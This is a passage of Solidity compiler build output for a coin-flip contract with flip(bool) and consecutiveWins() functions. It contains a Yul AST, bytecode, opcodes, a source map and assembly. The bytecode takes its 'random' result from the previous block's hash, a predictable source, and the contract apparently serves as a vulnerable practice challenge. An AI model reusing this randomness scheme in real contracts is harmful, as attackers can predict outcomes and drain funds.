																		"src": "2649:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2639:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2639:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2639:12:1"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nodeType": "YulFunctionDefinition",
												"src": "2540:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2703:76:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2757:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2766:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2769:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2759:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2759:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2759:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "2726:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "2748:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nodeType": "YulIdentifier",
																					"src": "2733:14:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2733:21:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "2723:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2723:32:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2716:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2716:40:1"
															},
															"nodeType": "YulIf",
															"src": "2713:60:1"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2696:5:1",
														"type": ""
													}
												],
												"src": "2663:116:1"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_bool(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function increment_t_uint256(value) -> ret {\n        value := cleanup_t_uint256(value)\n        if eq(value, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) { panic_error_0x11() }\n        ret := add(value, 1)\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d71461006b575b600080fd5b6100556004803603810190610050919061013b565b610089565b6040516100629190610186565b60405180910390f35b610073610120565b60405161008091906101a1565b60405180910390f35b60008060014361009991906101ed565b4060001c90508060015414156100ae57600080fd5b806001819055506000600254826100c591906101bc565b90506000600182146100d85760006100db565b60015b9050841515811515141561010c576000808154809291906100fb90610237565b91905055506001935050505061011b565b60008081905550600093505050505b919050565b60005481565b600081359050610135816102e3565b92915050565b600060208284031215610151576101506102de565b5b600061015f84828501610126565b91505092915050565b61017181610221565b82525050565b6101808161022d565b82525050565b600060208201905061019b6000830184610168565b92915050565b60006020820190506101b66000830184610177565b92915050565b60006101c78261022d565b91506101d28361022d565b9250826101e2576101e16102af565b5b828204905092915050565b60006101f88261022d565b91506102038361022d565b92508282101561021657610215610280565b5b828203905092915050565b60008115159050919050565b6000819050919050565b60006102428261022d565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82141561027557610274610280565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600080fd5b6102ec81610221565b81146102f757600080fd5b5056fea264697066735822122070f841c0b35b66133813d11abb56cf0494aa9d9a9f739c560475c962e3960e3264736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x13B JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x186 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0x120 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x80 SWAP2 SWAP1 PUSH2 0x1A1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x99 SWAP2 SWAP1 PUSH2 0x1ED JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0xAE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x2 SLOAD DUP3 PUSH2 0xC5 SWAP2 SWAP1 PUSH2 0x1BC JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xD8 JUMPI PUSH1 0x0 PUSH2 0xDB JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO EQ ISZERO PUSH2 0x10C JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xFB SWAP1 PUSH2 0x237 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x11B JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x135 DUP2 PUSH2 0x2E3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x151 JUMPI PUSH2 0x150 PUSH2 0x2DE JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x15F DUP5 DUP3 DUP6 ADD PUSH2 0x126 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x171 DUP2 PUSH2 0x221 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x180 DUP2 PUSH2 0x22D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x19B PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x168 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1B6 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x177 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C7 DUP3 PUSH2 0x22D JUMP JUMPDEST SWAP2 POP PUSH2 0x1D2 DUP4 PUSH2 0x22D JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1E2 JUMPI PUSH2 0x1E1 PUSH2 0x2AF JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F8 DUP3 PUSH2 0x22D JUMP JUMPDEST SWAP2 POP PUSH2 0x203 DUP4 PUSH2 0x22D JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x216 JUMPI PUSH2 0x215 PUSH2 0x280 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x242 DUP3 PUSH2 0x22D JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 EQ ISZERO PUSH2 0x275 JUMPI PUSH2 0x274 PUSH2 0x280 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2EC DUP2 PUSH2 0x221 JUMP JUMPDEST DUP2 EQ PUSH2 0x2F7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH17 0xF841C0B35B66133813D11ABB56CF0494AA SWAP14 SWAP11 SWAP16 PUSH20 0x9C560475C962E3960E3264736F6C634300080700 CALLER ",
							"sourceMap": "115:691:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;356:447;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;140:30;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;356:447;399:4;412:18;466:1;451:12;:16;;;;:::i;:::-;441:27;433:36;;412:57;;494:10;482:8;;:22;478:53;;;515:8;;;478:53;550:10;539:8;:21;;;;567:16;599:6;;586:10;:19;;;;:::i;:::-;567:38;;612:9;636:1;624:8;:13;:28;;647:5;624:28;;;640:4;624:28;612:40;;673:6;665:14;;:4;:14;;;661:137;;;690:15;;:17;;;;;;;;;:::i;:::-;;;;;;723:4;716:11;;;;;;;661:137;768:1;750:15;:19;;;;785:5;778:12;;;;;356:447;;;;:::o;140:30::-;;;;:::o;7:133:1:-;50:5;88:6;75:20;66:29;;104:30;128:5;104:30;:::i;:::-;7:133;;;;:::o;146:323::-;202:6;251:2;239:9;230:7;226:23;222:32;219:119;;;257:79;;:::i;:::-;219:119;377:1;402:50;444:7;435:6;424:9;420:22;402:50;:::i;:::-;392:60;;348:114;146:323;;;;:::o;475:109::-;556:21;571:5;556:21;:::i;:::-;551:3;544:34;475:109;;:::o;590:118::-;677:24;695:5;677:24;:::i;:::-;672:3;665:37;590:118;;:::o;714:210::-;801:4;839:2;828:9;824:18;816:26;;852:65;914:1;903:9;899:17;890:6;852:65;:::i;:::-;714:210;;;;:::o;930:222::-;1023:4;1061:2;1050:9;1046:18;1038:26;;1074:71;1142:1;1131:9;1127:17;1118:6;1074:71;:::i;:::-;930:222;;;;:::o;1239:185::-;1279:1;1296:20;1314:1;1296:20;:::i;:::-;1291:25;;1330:20;1348:1;1330:20;:::i;:::-;1325:25;;1369:1;1359:35;;1374:18;;:::i;:::-;1359:35;1416:1;1413;1409:9;1404:14;;1239:185;;;;:::o;1430:191::-;1470:4;1490:20;1508:1;1490:20;:::i;:::-;1485:25;;1524:20;1542:1;1524:20;:::i;:::-;1519:25;;1563:1;1560;1557:8;1554:34;;;1568:18;;:::i;:::-;1554:34;1613:1;1610;1606:9;1598:17;;1430:191;;;;:::o;1627:90::-;1661:7;1704:5;1697:13;1690:21;1679:32;;1627:90;;;:::o;1723:77::-;1760:7;1789:5;1778:16;;1723:77;;;:::o;1806:233::-;1845:3;1868:24;1886:5;1868:24;:::i;:::-;1859:33;;1914:66;1907:5;1904:77;1901:103;;;1984:18;;:::i;:::-;1901:103;2031:1;2024:5;2020:13;2013:20;;1806:233;;;:::o;2045:180::-;2093:77;2090:1;2083:88;2190:4;2187:1;2180:15;2214:4;2211:1;2204:15;2231:180;2279:77;2276:1;2269:88;2376:4;2373:1;2366:15;2400:4;2397:1;2390:15;2540:117;2649:1;2646;2639:12;2663:116;2733:21;2748:5;2733:21;:::i;:::-;2726:5;2723:32;2713:60;;2769:1;2766;2759:12;2713:60;2663:116;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "163200",
								"executionCost": "27328",
								"totalCost": "190528"
							},
							"external": {
								"consecutiveWins()": "2429",
								"flip(bool)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 115,
									"end": 806,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 115,
									"end": 806,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 115,
									"end": 806,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 213,
									"end": 290,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 196,
									"end": 290,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 196,
									"end": 290,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 297,
									"end": 350,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 297,
									"end": 350,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 297,
									"end": 350,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 297,
									"end": 350,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 343,
									"end": 344,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 325,
									"end": 340,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 325,
									"end": 344,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 325,
									"end": 344,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 325,
									"end": 344,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 325,
									"end": 344,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 115,
									"end": 806,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 115,
									"end": 806,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 115,
									"end": 806,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 115,
									"end": 806,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 115,
									"end": 806,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 115,
									"end": 806,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 115,
									"end": 806,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122070f841c0b35b66133813d11abb56cf0494aa9d9a9f739c560475c962e3960e3264736f6c63430008070033",
									".code": [
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "E6F334D7"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 115,
											"end": 806,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 806,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 140,
											"end": 170,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 140,
											"end": 170,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 356,
											"end": 803,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 356,
											"end": 803,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 399,
											"end": 403,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 412,
											"end": 430,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 466,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 451,
											"end": 463,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 451,
											"end": 467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 451,
											"end": 467,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 451,
											"end": 467,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 451,
											"end": 467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 451,
											"end": 467,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 451,
											"end": 467,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 451,
											"end": 467,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 441,
											"end": 468,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 433,
											"end": 469,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 433,
											"end": 469,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 412,
											"end": 469,
